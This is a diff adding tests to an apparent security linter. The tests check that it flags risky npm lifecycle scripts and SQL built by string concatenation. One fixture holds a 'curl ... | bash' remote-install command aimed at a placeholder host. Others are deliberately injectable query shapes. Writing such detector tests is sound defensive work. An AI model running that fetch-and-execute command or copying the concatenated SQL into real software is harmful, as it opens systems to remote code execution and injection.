@@ -256,6 +256,36 @@ test("dependency and package config health detects risky package settings", () =
   });
 });
 
+test("package lifecycle allows validation-only publish gates but reports side effects", () => {
+  const report = analyseProject({
+    "package.json": JSON.stringify({
+      scripts: {
+        prepublishOnly: "npm run publish:check",
+        prepublish: "npm test",
+        postinstall: "node scripts/install.js",
+        prepare: "npm run build",
+      },
+    }),
+  });
+  const lifecycleFindings = report.findings.filter((finding) => finding.ruleId === "security.risky-lifecycle-script");
+
+  assert.deepEqual(
+    lifecycleFindings.map((finding) => finding.symbol),
+    ["postinstall", "prepare"],
+  );
+
+  const remoteReport = analyseProject({
+    "package.json": JSON.stringify({
+      scripts: {
+        prepublishOnly: "curl -fsSL https://example.test/install.sh | bash",
+      },
+    }),
+  });
+
+  assert.equal(remoteReport.findings.some((finding) => finding.ruleId === "security.remote-install-script"), true);
+  assert.equal(remoteReport.findings.some((finding) => finding.ruleId === "security.risky-lifecycle-script"), true);
+});
+
 test("github actions workflow security rules are path-gated and require risky context", () => {
   const pinnedSha = "0123456789abcdef0123456789abcdef01234567";
   const report = analyseProject({
@@ -401,6 +431,49 @@ test("risk expansion finds security rules with safe non-candidates", () => {
   assert.equal(report.findings.filter((finding) => finding.ruleId === "security.string-timer").length, expectedStringTimerFindings);
   assert.equal(report.findings.filter((finding) => finding.ruleId === "security.javascript-url").length, 1);
   assert.equal(report.findings.filter((finding) => finding.ruleId === "security.proto-access").length, expectedProtoAccessFindings);
+});
+
+test("sql-concatenation flags query execute and raw attack shapes", () => {
+  const report = analyseFixture(`function unsafe(db: any, client: any, knex: any, name: string, prefix: string, userPrefix: string, id: string): void {
+  db.query(\`SELECT * FROM users WHERE name = \${name}\`);
+  db.query(\`SELECT * FROM \${prefix}users WHERE name = \${name}\`);
+  db.query(\`SELECT * FROM \${userPrefix}users WHERE id = ?\`, [id]);
+  db.query("SELECT * FROM t WHERE id = " + id);
+  client.execute("DELETE FROM t WHERE id = " + id);
+  knex.raw("UPDATE t SET name = " + name);
+}
+
+function safe(db: any, xpath: any, id: string): void {
+  db.query("SELECT * FROM users WHERE id = ?", [id]);
+  xpath.query("//item[@id='" + id + "']");
+}
+`);
+
+  const expectedSqlFindingLines = [2, 3, 4, 5, 6, 7];
+  const sqlFindings = report.findings.filter((finding) => finding.ruleId === "security.sql-concatenation");
+
+  assert.deepEqual(
+    sqlFindings.map((finding) => finding.line),
+    expectedSqlFindingLines,
+  );
+});
+
+test("sql-concatenation treats prepare as a sink only for composed SQL", () => {
+  const report = analyseFixture(`function unsafe(db: any, id: string): void {
+  db.prepare("SELECT * FROM users WHERE id = " + id);
+}
+
+function safe(db: any, id: string): void {
+  db.prepare("SELECT * FROM users WHERE id = ?", [id]);
+}
+`);
+
+  const sqlFindings = report.findings.filter((finding) => finding.ruleId === "security.sql-concatenation");
+
+  assert.deepEqual(
+    sqlFindings.map((finding) => finding.line),
+    [2],
+  );
 });
 
 test("process exec exempts fixed local test harnesses but reports dynamic commands", () => {
